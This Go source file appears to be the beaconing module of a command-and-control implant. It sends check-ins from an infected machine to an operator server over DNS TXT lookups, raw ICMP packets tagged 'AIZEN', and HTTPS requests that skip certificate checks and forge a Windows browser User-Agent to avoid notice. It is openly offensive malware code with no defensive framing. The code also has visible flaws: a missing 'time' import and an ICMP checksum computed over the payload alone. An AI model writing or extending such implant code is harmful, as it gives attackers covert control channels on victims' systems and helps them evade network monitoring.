package beacon

import (
	"crypto/tls"
	"log"
	"net"
	"net/http"
)

func (c *C2) BeaconDNS() {
	domain := c.Server
	query := c.ID
	fqdn := query + "." + domain
	_, err := net.LookupTXT(fqdn)
	if err != nil {
		log.Println("[!] DNS beacon failed:", err)
		return
	}
	log.Println("[+] DNS beacon sent")
}

func (c *C2) BeaconICMP() {
	conn, err := net.Dial("ip4:icmp", c.Server)
	if err != nil {
		log.Println("[!] ICMP beacon failed:", err)
		return
	}
	defer conn.Close()

	payload := []byte("AIZEN")
	checksum := icmpChecksum(payload)
	packet := []byte{0x08, 0x00, byte(checksum >> 8), byte(checksum & 0xff)}
	packet = append(packet, payload...)
	conn.Write(packet)
}

func icmpChecksum(data []byte) uint16 {
	sum := 0
	for i := 0; i < len(data)-1; i += 2 {
		sum += int(data[i])<<8 | int(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += int(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum += sum >> 16
	return uint16(^sum)
}

func (c *C2) BeaconHTTPS() {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	req, _ := http.NewRequest("GET", c.Server+"/"+c.ID, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml")

	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		log.Println("[+] HTTPS beacon sent")
	}
}